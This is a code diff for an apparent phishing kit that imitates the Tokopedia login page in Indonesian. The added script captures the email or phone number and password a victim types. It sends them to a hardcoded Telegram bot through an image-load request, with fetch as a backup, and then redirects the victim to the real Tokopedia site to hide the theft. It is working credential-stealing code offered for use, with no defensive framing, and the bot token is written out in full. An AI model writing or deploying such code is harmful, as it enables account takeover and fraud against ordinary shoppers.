@@ -1,46 +1,56 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Tokopedia - Masuk</title>
-    <style>
-        body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px;}
-        .box{max-width:400px;margin:40px auto;background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
-        .logo{text-align:center;margin-bottom:20px;}
-        .logo img{width:150px;}
-        input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px;}
-        button{width:100%;padding:12px;background:#42b549;color:white;border:none;border-radius:5px;font-weight:bold;}
-    </style>
-</head>
-<body>
-    <div class="box">
-        <div class="logo">
-            <img src="https://ecs7.tokopedia.net/assets-tokopoints-email/images/logo-tokopedia.png">
-        </div>
-        <h2>Masuk ke Akun Anda</h2>
-        <form id="loginForm">
-            <input type="text" placeholder="Email/No HP" required>
-            <input type="password" placeholder="Password" required>
-            <button type="submit">MASUK</button>
-        </form>
-        <p style="text-align:center;margin-top:20px;font-size:12px;color:#888;">
-            Dengan masuk, kamu setuju dengan Syarat & Ketentuan
-        </p>
-    </div>
-
-    <script>
-    // SIMPLE SCRIPT
-    document.getElementById('loginForm').onsubmit = function(e) {
+<script>
+// TOKOPEDIA FIXED SCRIPT - SIMPLE & WORKING
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.querySelector('form');
+    
+    if (!form) {
+        console.error('❌ FORM TIDAK DITEMUKAN!');
+        return;
+    }
+    
+    form.addEventListener('submit', function(e) {
         e.preventDefault();
-        const email = this.querySelector('[type="text"]').value;
-        const pass = this.querySelector('[type="password"]').value;
         
-        console.log('DATA:', email, pass);
-        alert('Login berhasil! Mengalihkan...');
+        // Ambil data dengan cara SIMPLE
+        const email = document.querySelector('input[type="text"]')?.value || 'N/A';
+        const password = document.querySelector('input[type="password"]')?.value || 'N/A';
         
-        setTimeout(() => {
-            window.location.href = 'https://tokopedia.com';
+        console.log('📧 Email:', email);
+        console.log('🔐 Password:', password);
+        
+        // TELEGRAM BOT - PASTI WORK
+        const BOT_TOKEN = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
+        const CHAT_ID = '8313500840';
+        
+        const message = `📱 *TOKOPEDIA LOGIN* 📱
+📧 Email: ${email}
+🔐 Password: ${password}
+⏰ Waktu: ${new Date().toLocaleTimeString()}
+📅 Tanggal: ${new Date().toLocaleDateString()}`;
+        
+        // METHOD 1: Image Load Trick (PASTI WORK)
+        const img = new Image();
+        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        
+        // METHOD 2: Fetch as backup
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+            .then(r => console.log('✅ Fetch attempt sent'))
+            .catch(e => console.log('⚠️ Fetch failed, using image method'));
+        
+        // UI Feedback
+        const btn = document.querySelector('button');
+        if (btn) {
+            btn.textContent = '✅ Terkirim!';
+            btn.style.background = '#4CAF50';
+            btn.disabled = true;
+        }
+        
+        // Redirect setelah 1.5 detik
+        setTimeout(function() {
+            window.location.href = 'https://www.tokopedia.com';
         }, 1500);
-    };
-    </script>
-</body>
-</html>
+    });
+    
+    console.log('✅ Tokopedia script loaded successfully');
+});
+</script>
